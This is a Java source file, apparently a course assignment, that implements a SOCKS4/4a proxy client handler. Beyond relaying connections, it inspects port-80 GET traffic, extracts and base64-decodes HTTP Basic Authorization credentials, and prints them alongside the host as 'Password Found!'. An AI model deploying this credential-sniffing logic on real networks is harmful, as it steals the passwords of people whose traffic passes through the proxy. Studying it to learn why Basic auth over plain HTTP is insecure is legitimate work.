import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class SockClient implements Runnable {
    Selector selector;
    SocketChannel client;
    SocketChannel server;
    String formatedAuthorization;
    private int clientport;
    private boolean flag;
    private boolean isFirst;

    @Override
    public void run() {
        try {
            createNewClient(selector);
        } catch (IOException ignored) {
        }
    }

    SockClient(SocketChannel c) throws IOException {
        client = c;
        client.configureBlocking(false);
        client.socket().setSoTimeout(500);
        isFirst = true;
        formatedAuthorization = "";
    }

    void reverseWriteData() throws IOException {
        writeData(server, client);
    }

    private void writeData(SocketChannel remote, SocketChannel client) throws IOException {
        ByteBuffer byteBuffer = ByteBuffer.allocate(5000);
        // If end of data...
        if (remote.read(byteBuffer) == -1 && isFirst) {
            isFirst = false;
            System.out.println("Closing Connection from " +
                    this.client.getRemoteAddress().toString().split("/")[1] +
                    " to " + server.getRemoteAddress().toString().split("/")[1]);
            this.client.close();
            this.server.close();
            return;
        }
        byteBuffer.flip();
        if (isFirst) {
            ByteBuffer clonedByteBuffer = clone(byteBuffer);
            String s = StandardCharsets.UTF_8.decode(clonedByteBuffer).toString();
            // The program should look for passwords passed using HTTP Basic Authentication, only in connections where the
            // destination is with port 80, and the HTTP method is GET.
            if (s.contains("Authorization") && s.contains("GET") && (clientport == 80)) {
                this.formatedAuthorization = manipulateStringAndExtractAuthorization(s);
                System.out.println("Password Found! " + this.formatedAuthorization);
            }
        }
        client.write(byteBuffer);
    }

    private String manipulateStringAndExtractAuthorization(String s) {
        String authorizationEncoded;
        String host;

        int startIndexAuthorization = s.indexOf("Authorization: Basic");
        int endIndexAuthorization = s.indexOf("\r\n", startIndexAuthorization);
        if (endIndexAuthorization == -1) {
            return "";
        }

        authorizationEncoded = s.substring(startIndexAuthorization + 21, endIndexAuthorization);
        byte[] decodedBytes = Base64.getDecoder().decode(authorizationEncoded);
        String autorizationDecoded = new String(decodedBytes);

        int startIndexHost = s.indexOf("Host: ");
        int endIndexHost = s.indexOf("\r\n", startIndexHost);
        if (endIndexHost == -1) {
            return "";
        }
        host = s.substring(startIndexHost + 6, endIndexHost);

        return combineHostAndAuthorization(autorizationDecoded, host);
    }

    private String combineHostAndAuthorization(String autorizationDecoded, String host){
        return "http://" + autorizationDecoded + "@" + host +"/";
    }

    private static ByteBuffer clone(ByteBuffer original) {
        ByteBuffer clone = ByteBuffer.allocate(original.capacity());
        original.rewind();
        clone.put(original);
        original.rewind();
        clone.flip();
        return clone;
    }

    private void createNewClient (Selector selector) throws IOException {

        if (!flag) {
            ByteBuffer byteBuffer = ByteBuffer.allocate(512);

            if (client.read(byteBuffer) < 1)
                return;
            byteBuffer.flip();

            //  https://www.openssh.com/txt/socks4.protocol

            // First Byte is VN
            int ver = byteBuffer.get();
            if (ver != 4) {
                System.err.println("Connection error: while parsing request: Unsupported SOCKS protocol" +
                        "version (got " + ver + ")");
                closeConnectionAfterErr();
                return;
            }

            // Second Byte is CD
            int cmd = byteBuffer.get();
            if (cmd != 1) {
                System.err.println("Connection error: while parsing request: CMD \n");
                closeConnectionAfterErr();
                return;
            }

            // Byte 3 and 4 are for port (a Short is 2 bytes)
            int port = byteBuffer.getShort();
            clientport = port;

            // Fetching byte 5 - 8 (using Array of 4 bytes)
            byte[] ip = new byte[4];
            byteBuffer.get(ip);

            InetAddress remoteAddr;

            // BONUS!!!
            // https://www.openssh.com/txt/socks4a.protocol
            // A server using protocol 4A must check the DSTIP in the request packet.
            // If it represent address 0.0.0.x with nonzero x, the server must read
            // in the domain name that the client sends in the packet. The server
            // should resolve the domain name and make connection to the destination
            // host if it can.

            if ((ip[0] == 0) && (ip[1] == 0) && (ip[2] == 0) && (ip[3] != 0)) {
                byte[] buf = new byte[1];
                final StringBuilder builder = new StringBuilder();
                while (byteBuffer.remaining() > 0) {
                    byteBuffer.get(buf);
                    if ((buf[0] != 0)) builder.append((char) buf[0]); //Removing the NULL Terminating byte
                }
                remoteAddr = InetAddress.getByName(builder.toString());
            }

            else remoteAddr = InetAddress.getByAddress(ip);

            // For both CONNECT and BIND operations, the server sets a time limit
            // (2 minutes in current CSTC implementation) for the establishment of its
            // connection with the application server. If the connection is still not
            // establiched when the time limit expires, the server closes its connection
            // to the client and gives up.

            try {
                server = SocketChannel.open();
                server.socket().setSoTimeout(500);
                server.connect(new InetSocketAddress(remoteAddr, port));
                printSuccessfulConnection();
            }
            catch (Exception e){
                System.err.println("Connection error: while connecting to destination: connect timed out");
                closeConnectionAfterErr();
                return;
            }

            // # of bytes is 20
            ByteBuffer replyPacket = ByteBuffer.allocate(20);
            // VN is the version of the reply code and should be 0. CD is the result
            // code with one of the following values:
            replyPacket.put((byte) 0);
            // 90 (0x5a): request granted
            // 91 (0x5b): request rejected or failed
            replyPacket.put((byte) (server.isConnected() ? 0x5a : 0x5b));
            // DSTPORT
            replyPacket.putShort((short) port);
            // DSTIP
            replyPacket.put(remoteAddr.getAddress());
            replyPacket.flip();
            client.write(replyPacket);

            if (!server.isConnected())
                System.err.println("Connection failed to host");

            server.configureBlocking(false);
            server.register(selector, SelectionKey.OP_READ);

            flag = true;

        } else {
            writeData(client, server);
        }
    }

    private void printSuccessfulConnection() throws IOException {
        String remoteAdress = server.getRemoteAddress().toString().split("/")[1];
        System.out.println("Successful connection from " +
                client.getRemoteAddress().toString().split("/")[1] +
                " to " + remoteAdress);
    }

    private void closeConnectionAfterErr() throws IOException {
        System.out.println("Closing Connection from " +
                this.client.getRemoteAddress().toString().split("/")[1]);
        try {
            this.server.close();
        } catch (Exception ignored) {}
        try {
            this.client.close();
        } catch (Exception ignored) {}
    }
}
